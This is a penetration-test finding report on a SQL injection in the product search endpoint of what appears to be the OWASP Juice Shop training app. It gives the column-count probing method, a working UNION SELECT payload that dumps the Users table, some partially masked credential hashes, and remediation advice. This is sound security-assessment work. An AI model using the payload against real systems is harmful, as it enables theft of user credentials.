# Finding F-007: Full User Database Extraction via SQL Injection in Product Search Endpoint

| Field | Value |
|---|---|
| Finding ID | F-007 |
| Title | UNION-Based SQL Injection in `/rest/products/search` Allows Extraction of All User Credentials |
| Category | OWASP Top 10 — A03:2021 Injection |
| Severity | **Critical** |
| CVSS 3.1 (estimated) | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Status | Confirmed |
| Affected Component | `GET /rest/products/search` — `q` parameter |
| Date Identified | 2026-09-29 |

## Summary

The product search endpoint is vulnerable to classic UNION-based SQL injection. The
`q` parameter is concatenated directly into a raw SQL query with no parameterization
or sanitization. By determining the exact column count of the underlying query and
crafting a matching `UNION SELECT` statement, it was possible to retrieve **every
user account's email address, password hash, role, and deluxe-membership token** in
a single request — a complete database dump of the application's user table,
delivered through a public-facing search feature.

This is the most severe and highest-impact finding in this assessment: it does not
target one account (like F-002 or F-006), it exposes **all accounts simultaneously**.

## Discovery Process (methodology)

1. **Confirmed the injection point.** A single quote (`'`) and structured payloads
   in the `q` parameter produced a verbose `SQLITE_ERROR` response, revealing the
   application's raw internal query and confirming string concatenation was in use
   (see F-006 for the related login-endpoint discovery of the same root pattern).
2. **Determined the column count.** Using an `ORDER BY N` probe (incrementing `N`
   until the server errored), the exact column count of the `Products` query was
   established: the server's own error message confirmed *"1st ORDER BY term out
   of range - should be between 1 and 9"* — i.e., exactly **9 columns**.
3. **Crafted a matching `UNION SELECT`.** With the column count known, a 9-value
   `UNION SELECT` was built, pulling `id`, `email`, `password`, `role`, and
   `deluxeToken` from the `Users` table (with `NULL` padding for the remaining
   4 columns), and submitted as the search query.
4. **Result:** the search endpoint returned the full contents of the `Users`
   table, interleaved with normal product results.

## Payload

```
q=')) UNION SELECT id,email,password,role,deluxeToken,NULL,NULL,NULL,NULL FROM Users--
```

URL-encoded, sent as:
```
GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2Crole%2CdeluxeToken%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20Users--
```

## Evidence

The application's own challenge tracker independently confirmed the exploit:
> "You successfully solved a challenge: User Credentials (Retrieve a list of all
> user credentials via SQL Injection.)"

**Representative sample of extracted records** (full dump contained 20+ accounts;
password hash values below are truncated/partially masked for this summary —
full unredacted evidence is retained in the sanitized evidence file per project
standards):

| id | email | password (MD5 hash, truncated) | role |
|---|---|---|---|
| 1 | admin@juice-sh.op | 0192023a...b500 | admin |
| 4 | bjoern.kimminich@gmail.com | 6edd9d72...57b8c | admin |
| 5 | ciso@juice-sh.op | 861917d5...81a8fb | deluxe |
| 6 | support@juice-sh.op | 3869433d...36bc82 | admin |
| 9 | J12934@juice-sh.op | 3c2abc04...3714b7d | admin |
| 12 | bjoern@juice-sh.op | 7f311911...051d6810 | admin |
| 17 | demo | fe01ce2a...ad04e229 | customer |
| 20 | stan@juice-sh.op | e9048a3f...5d7e39 | deluxe |
| 23 | cloud-admin@juice-sh.op | 127af90b...88ab502 | admin |

Full raw request/response, and the complete unredacted extraction (for internal
verification only, not for wider distribution), saved in
`evidence/requests-responses/F-007-sqli-full-user-dump.txt`.

*(Sanitization note: even the truncated hashes above should not be committed in
full to the public repository. Follow the project's evidence-handling standard —
partial masking, e.g. first/last 8 characters — consistent with how F-001 and
F-002 evidence was handled.)*

## Notable Observations From the Extracted Data

- **At least 6 distinct `admin`-role accounts** exist beyond the primary one used
  in F-006, indicating multiple administrative identities in the system — each
  represents a separate high-value target.
- A dedicated **`ciso@juice-sh.op`** account exists with `deluxe` role and a
  populated `deluxeToken` — an account whose name alone suggests elevated
  organizational significance, now fully compromised in terms of credential
  material.
- An account with username `demo` (no email format) uses a password hash
  (`fe01ce2a7fbac8fafaed7c982a04e229`) that is a **known, publicly recognizable
  MD5 hash of the word "demo"** — meaning this credential could be trivially
  cracked even without this vulnerability, compounding the risk (see F-001 for
  the related weak-hashing-algorithm finding).
- Non-admin roles beyond `customer` and `deluxe` were also observed (e.g.,
  `accounting`), indicating a more complex role/permission model than initially
  mapped in `attack-surface-map.md` — worth revisiting Section 4 of that
  document with this new information.

## Impact

- **Complete compromise of the user credential database** in a single,
  unauthenticated-capable request (the endpoint itself, per the application's
  design, does not require a prior login for basic search — full verification
  of whether an anonymous, fully logged-out session can reproduce this exact
  extraction is recommended as an immediate follow-up, since the request shown
  here happened to carry a leftover Authorization header from prior testing).
- Every password hash in the system is now exposed to offline cracking, at scale
  — not one account, but the entire user base at once.
- Combined with **F-001** (weak, unsalted MD5 hashing) and the `demo` account
  example above, a significant portion of these hashes are very likely
  crackable in practice, not just theoretically.
- Combined with **F-006**, this finding demonstrates the SQL injection root
  cause is not confined to a single endpoint — it is a **systemic pattern**
  affecting at least two independent, unrelated routes (`/rest/user/login` and
  `/rest/products/search`), strongly suggesting the same vulnerable
  query-building approach is used throughout the codebase and other endpoints
  likely share the same flaw.
- This is the single most damaging finding in the assessment: it provides an
  attacker with durable, offline access to attempt credential cracking and
  credential-stuffing attacks against every account in the system, entirely
  independent of any other vulnerability being fixed.

## Root Cause

Identical root cause to **F-006**: the search query is built via raw string
concatenation of user input into a SQL statement, rather than using parameterized
queries. The `ORDER BY` and `UNION SELECT` clauses were both accepted without any
validation, confirming no input sanitization or query-structure enforcement exists
on this endpoint at all.

## Remediation

1. **Use parameterized queries / prepared statements** for the search endpoint,
   identical guidance to F-006 — this is the primary and only real fix.
2. **Immediately audit every other endpoint in the application** for the same
   concatenation pattern, given it has now been confirmed on two independent
   routes. Treat this as a codebase-wide code-review priority, not a
   one-off patch.
3. **Disable verbose SQL error messages in production** (see the related
   observation in F-006's discovery process) — the leaked query structure and
   stack traces materially accelerated this exploitation and should never be
   exposed to end users regardless of the underlying injection being fixed.
4. **Force a full password reset for all accounts** if this were a real,
   deployed system, given every hash in the database must now be considered
   compromised.
5. **Migrate off MD5** for password hashing (see F-001) as a defense-in-depth
   measure, so that even a future injection incident does not yield instantly
   crackable credentials.
6. Apply a Web Application Firewall (WAF) rule set targeting common SQL
   injection patterns as a short-term compensating control while the underlying
   code is remediated — not a substitute for the fix, but a reasonable
   stop-gap.

## Related Findings

- **F-006** (SQL Injection Login Bypass) — same root cause, different endpoint;
  together these two findings should be presented as one systemic issue in the
  executive summary rather than two unrelated bugs.
- **F-001** (Weak/Exposed Password Hashing) — compounds the impact of this
  finding directly, since the extracted hashes are weak and some are trivially
  crackable.

## Follow-Up Testing (planned)

- [ ] Reproduce this exact extraction using a completely unauthenticated
      (logged-out, no token/cookie at all) request, to determine definitively
      whether authentication is required or incidental to this exploit.
- [ ] Test whether other tables (e.g., `Orders`, `Baskets`, `Feedbacks`) are
      similarly extractable via the same technique.
- [ ] Test whether write-based SQL injection (e.g., via `UPDATE`/`INSERT`
      injection, if reachable) is possible on any endpoint, which would allow
      data modification rather than only extraction.

## References

- OWASP Top 10 2021 — A03: Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
  ('SQL Injection')
- OWASP SQL Injection Prevention Cheat Sheet —
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
